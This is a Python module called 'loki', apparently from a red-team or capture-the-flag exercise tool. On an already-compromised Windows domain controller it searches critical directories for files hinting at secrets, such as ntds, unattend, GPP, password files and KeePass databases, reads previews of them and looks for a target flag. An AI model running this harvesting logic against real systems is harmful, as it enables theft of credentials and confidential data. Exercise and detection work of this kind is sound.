# modules/loki.py

BANNER = r"""
                   █      ███  █   █ ███   
                   █░    █ ░░█ █░ █ ░ █░░  
                   █░░   █░ ░█░███ ░ ░█░░░ 
                   █░░   █░░ █░█░░█ ░ █░░  
                   █████  ███ ░█░░░█ ███░  
                   ░░░░░  ░░░ ░░░  ░ ░░░  
                    ░░░░░  ░░░  ░   ░ ░░░
 
              ▒▒▓███▓▓▒░             ▒▒░  ░░▒░
             ▓█▓▓███████▓▒░      ░▒▓█▓▒▓██▓▒▓█▓
            ▒█░  ░▓███████▓▓▒▒▒▓▓███████▓▒   ░█▒
            ▓▒     ░▓███████▓██▓██████▓▒      ▒▓
            ░▒░      ░███████████████▓       ░▒░
            ██▓       ░██████████████        ▓██
             ░      ░▓░▓████████████▓░▓░      ░
                     ██▓▒▓████████▒▒▓█▓
                     ▓█░   ░▒▒▒▒░   ░█▒
                     ▓▓░▒▒▒░░ ░  ▒▓▒░▓▒
                     ▓░░▓▓▒▓▒ ░▒▓▒▓▒ ░▒
                 ░   █  ░░░  ░░  ░░░ ░█
                ▓░  ▒█░▒░░░ ▓▒▒▓ ░░░▒░█▒  ░▓
               ░█▓░ ▒█▓░░▒▒░░▒▒░░▒▒░░▓█▒ ░▓█
                ░▓████▒▒░ ▓▓░░▒▒▓▓ ░▓▓████▓░
                  ░▒▓░  ▒▒ ▓▒▓▓▒▓ ▒▒  ░▓▒░
                    ▓▓▒▒░░▓░▒▒▒▒░▓░░▒▒▓▓
                  ▒▓████▒  ▓▒▒▒▒▓  ▒████▓▒
                      ▓█▓░ ▓▓▒▒▓▓ ░██▒
                      ▒▓   ▒████░   ▓░
                      ▒     ▒█▓░     ░
                             ▒░  

    ---------------------------------------------------------
                Cryptographic Mischief Module
                Author: Bruno Paniagua García
    ---------------------------------------------------------
"""

import re
import config

# Directorios criticos donde suele haber botin/objetivos en un DC.
CRITICAL_DIRECTORIES = [
    r"C:\Users\Administrador\Desktop",
    r"C:\Users\Administrator\Documents",
    r"C:\Users",
    r"C:\ProgramData",
    r"C:\Windows\Temp",
    r"C:\Windows\SYSVOL",
    r"C:\datos_criticos",
]

# Nombres que sugieren ficheros criticos / objetivo.
CRITICAL_KEYWORDS = [
    "flag", "secret", "secrets", "password", "passwords", "creds",
    "credential", "credentials", "backup", "confidential", "admin",
    "ntds", "unattend", "gpp", "groups", "vault", "key",
]

# Extensiones susceptibles de contener el objetivo.
CRITICAL_EXTENSIONS = [
    ".txt", ".flag", ".log", ".xml", ".config", ".ini",
    ".ps1", ".csv", ".json", ".kdbx", ".bak",
]

FLAG_PATTERN = re.compile(r"FLAG\{[^}]+\}")
MAX_FILE_SIZE = 1 * 1024 * 1024   # 1 MB
PREVIEW_CHARS = 200               # cuanto se muestra de cada fichero


def _filename(path):
    return path.lower().rsplit("\\", 1)[-1]


def _is_critical(path):
    name = _filename(path)
    if any(name.endswith(ext) for ext in CRITICAL_EXTENSIONS):
        return True
    if any(kw in name for kw in CRITICAL_KEYWORDS):
        return True
    return False


def _read(access, path):
    try:
        size = access.file_size(path)
    except Exception:
        return None
    if size is None or size > MAX_FILE_SIZE:
        return None
    try:
        data = access.read_file(path)
    except Exception:
        return None
    if data is None:
        return None
    if isinstance(data, bytes):
        return data.decode("utf-8", errors="ignore")
    return str(data)


def loot(access):
    """
    Recolecta y lee los ficheros criticos del DC ya comprometido. Loki NO
    distingue honeypots de ficheros reales: lee todo lo que encaja en el
    diccionario, igual que haria un operador. Que un canario dispare el
    evento 4663 (SACL) es una consecuencia observable del lado Blue, no
    algo que Loki decida ni sepa.

    Devuelve:
        {
          "critical_files": [ {"path", "preview", "has_flag"}, ... ],
          "flag": <str o None>,
        }
    """
    critical_files = []
    flag = None
    flag_path = None
    seen = set()

    for directory in CRITICAL_DIRECTORIES:
        try:
            files = access.list_files(directory, recurse=True)
        except Exception:
            continue

        for path in files or []:
            if not path or path in seen:
                continue
            seen.add(path)
            if not _is_critical(path):
                continue

            content = _read(access, path)

            if content is None:
                # Critico por nombre pero no legible como texto (binario,
                # .kdbx, .xlsx...): se registra igualmente como hallazgo.
                critical_files.append({
                    "path": path,
                    "preview": "(no legible como texto)",
                    "has_flag": False,
                })
                continue

            match = FLAG_PATTERN.search(content)
            has_flag = bool(match)
            if has_flag and match.group(0) == config.TARGET_FLAG:
                flag = match.group(0)
                flag_path = path

            preview = content.strip().replace("\n", " ")[:PREVIEW_CHARS]
            critical_files.append({
                "path": path,
                "preview": preview,
                "has_flag": has_flag,
            })

    return {"critical_files": critical_files, "flag": flag, "flag_path": flag_path}